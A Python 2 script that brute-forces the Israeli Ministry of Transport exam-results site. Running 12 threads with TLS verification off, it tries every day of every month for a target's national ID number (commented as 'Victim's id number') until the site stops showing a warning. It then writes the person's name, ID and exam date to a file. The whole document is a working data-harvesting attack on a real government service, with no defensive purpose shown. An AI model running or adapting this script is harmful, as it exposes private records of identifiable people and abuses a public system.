#!/usr/bin/python
import requests
import sys, threading, json

hit = False

def ParseDate(day,month,year):
	return str(day) + '/'+ str(month) + '/' + str(year)

def ArrBound(arr,i,defu):
	try:
		return int(arr[i])
	except IndexError:
		return defu

class Scraper(threading.Thread):
	url = 'https://motssl5.mot.gov.il/motmf/exams.php' #The website
	id_num = ArrBound(sys.argv,1,"123456789")          #Victim's id number
	year = ArrBound(sys.argv,2,"2013")                 #Theory test year
	def __init__(self,name,month):
		threading.Thread.__init__(self)        #threads stuff
		self.name = name                       #thread name
		self.month = month					   #thread's month
		self.day = 1                           #starting day
		self.payload = {'id':str(self.id_num),'theory_exam_date':
		 			    ParseDate(self.day,self.month,self.year),'submitted':1} 

		#run the thread
	def run(self):
		print self.name + " is starting!"
		scrape(self)
		print self.name + " is exiting!"
		
	def restartThread(self):
		threading.Thread.__init__(self)

def scrape(me):
	while True:
		# Submit the form
		r = requests.post(me.url,data=me.payload,verify=False)

		global hit
		if r.text.encode('utf-8').find("warning") == -1:  #If warning div isnt found = score!
			print "\nResult:"                             #find returns -1 when nothing is found
			print me.id_num
			print me.payload['theory_exam_date']
			hit = True
			log(me.id_num,me.payload['theory_exam_date'])

			print "\n\nWaiting for the rest of"\
				  " the threads to finish...\n"
			break
		elif hit:
			break
		else:
			me.day += 1
			if me.day == 32:
				break
			me.payload["theory_exam_date"] = ParseDate(me.day,me.month,me.year)

	#Log results
def log(id_num, date):
	json_f = open("id.json","r")
	data = json.load(json_f)

	for user in data["data"]:
	    if id_num == user["id"]:
	        with open("drive_results2.txt","a") as res:
	        	res.write(user["name"][:user["name"].index("(")].encode('utf8') \
	        		+ ", " + str(id_num) + " --> " + date + "\n")
			break

# Check input
if len(sys.argv) == 1:
	print "\nusage: python " + sys.argv[0] \
	+ " <id> <starting year>\n"
	sys.exit()

print "\nID: " + str(sys.argv[1])
print "Year: " + str(ArrBound(sys.argv,2,"2013")) + "\n\n"

# Create new threads
threads = []
for i in range(12):
	threads.append(Scraper("Thread " + str(i+1), str(i+1).zfill(2)))
	threads[i].start()

# Wait for threads to finish
for t in threads:
	t.join()

while not hit:
	print "Nothing was found..."
	inpt = str(chr(ord(raw_input("Would you like to try a different year?(y\\n) ")[0]) | 32))
	print inpt
	if inpt == 'y':
		new_year = raw_input("Enter the new year: ")
		for t in threads:
			t.year = str(new_year)
			t.day = 1
			t.restartThread()
			t.start()
        for t in threads:
            t.join()
	if inpt == 'n':
		sys.exit()
